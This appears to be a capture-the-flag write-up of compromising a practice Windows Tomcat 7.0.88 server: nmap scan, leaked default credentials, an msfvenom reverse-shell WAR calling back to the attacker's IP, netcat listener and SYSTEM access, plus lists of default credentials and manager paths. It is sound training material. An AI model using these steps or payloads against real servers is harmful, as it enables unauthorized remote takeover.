---

## Machine Information

- **Operating System**: Windows
- **Web Server**: Apache Tomcat 7.0.88
- **Port**: 8080
- **Service**: Java Web Application Server

---

## Reconnaissance & Enumeration

### Nmap Scan

Started with a comprehensive port scan to identify services:

```bash
nmap -sV -sC -Pn 10.129.136.9
```

**Note:** Used `-Pn` flag because the host appeared down without it. This bypasses ping checks and performs a full port scan regardless of ICMP responses.

**Open Ports:**
- **Port 8080**: Apache Tomcat 7.0.88

**Key Findings:**
- Apache Tomcat running on non-standard port 8080
- Tomcat manager interface likely accessible
- Running outdated Tomcat version 7.0.88 (released 2016, unsupported since 2019)
- Potential for credential discovery and WAR file upload exploitation

---

## Exploitation

### Stage 1: Accessing Tomcat Manager

Attempted to access the Tomcat manager GUI at the standard path:

```bash
http://10.129.136.9:8080/manager/html
```

Then tried the alternate host manager path:

```bash
http://10.129.136.9:8080/host-manager/html
```

### Stage 2: Credential Leak via Failed Login

Attempted login with default credentials. The **failed login error message leaked valid credentials**:

Credentials Found: tomcat:s3cret


**Key Learning:** Always read error messages carefully — they often contain valuable information like username/password hints or system details.

### Stage 3: Successful Authentication

Used the discovered credentials to login to Tomcat manager:

Username: tomcat
Password: s3cret


Successfully authenticated to the Tomcat manager GUI.

### Stage 4: Generating Reverse Shell WAR File

Created a malicious WAR (Web Application Archive) file containing a reverse shell payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.193 LPORT=4444 -f war > shell.war
```

**Explanation:**
- `msfvenom` — Metasploit payload generator
- `java/jsp_shell_reverse_tcp` — Java JSP reverse shell payload
- `LHOST` — Attacker's IP address
- `LPORT` — Listening port (4444)
- `-f war` — Output format as WAR file
- `shell.war` — Output filename

### Stage 5: Uploading WAR File

Uploaded the `shell.war` file through the Tomcat manager GUI:
- Clicked "Deploy" section
- Selected WAR file to upload
- Application deployed successfully as `/shell`

### Stage 6: Establishing Reverse Connection

Started a netcat listener on the attacker machine:

```bash
nc -lvnp 4444
```

Then accessed the uploaded shell application:

```bash
http://10.129.136.9:8080/shell/
```

**Result:** Reverse shell connection established.

### Stage 7: Verifying System Access

Checked privileges on the compromised system:

```bash
whoami
```

**Output:**

nt authority\system


**Success!** Achieved SYSTEM-level access on the Windows machine.

## Summary & Key Takeaways

### Attack Chain

1. **Enumeration** → Identified Apache Tomcat 7.0.88 on port 8080
2. **Credential Discovery** → Error message leaked tomcat:s3cret credentials
3. **Authentication** → Logged into Tomcat manager GUI
4. **Payload Generation** → Created malicious WAR reverse shell with msfvenom
5. **Application Deployment** → Uploaded WAR via Tomcat manager
6. **Code Execution** → Accessed deployed application to trigger shell
7. **Reverse Connection** → Established reverse shell to attacker listener
8. **Flag Retrieval** → Captured both flags from Administrator Desktop

### Key Vulnerabilities

- **Weak Credentials** — Default/weak password in error message
- **Information Disclosure** — Failed login reveals usernames
- **Application Upload** — Tomcat manager allows arbitrary WAR deployment
- **No Input Validation** — WAR files executed without security checks
- **Outdated Version** — Tomcat 7.0.88 is unsupported and vulnerable

### Critical Details

- **Tomcat Manager Access** — The Tomcat manager is a direct gateway to RCE if credentials are obtained
- **WAR File Execution** — WAR files contain JSP code that executes server-side with Tomcat's privileges
- **Privilege Level** — Tomcat runs as SYSTEM on this Windows installation, providing immediate admin access
- **Credential Leak Pattern** — Applications often leak information in error messages

### Default Tomcat Credentials to Try

When encountering Tomcat, try these default credentials:
- `tomcat:tomcat`
- `tomcat:s3cret`
- `admin:admin`
- `admin:tomcat`

### Tomcat Manager Paths

Always check these paths on Tomcat installations:
- `/manager/html` — Manager GUI
- `/host-manager/html` — Host Manager
- `/manager/text` — Manager API (text interface)
- `/docs/` — Documentation

### Tools Used

- `nmap` — port scanning and service enumeration
- `msfvenom` — payload generation for WAR file creation
- `nc (netcat)` — reverse shell listener
- Browser — accessing Tomcat manager GUI

### Lessons Learned

- **Always bypass ping checks** — Use `-Pn` if host appears unreachable
- **Read error messages carefully** — They often leak credentials or system information
- **Try manager paths on Tomcat** — `/manager/html` is the first place to check
- **Weak credentials are common** — Many systems use default or predictable passwords
- **WAR files are executable** — Tomcat executes code in deployed WAR files with server privileges
- **Credential reuse is dangerous** — The tomcat user's weak password gave direct admin access
- **Enum common ports** — Non-standard ports like 8080 are easy to miss but often vulnerable
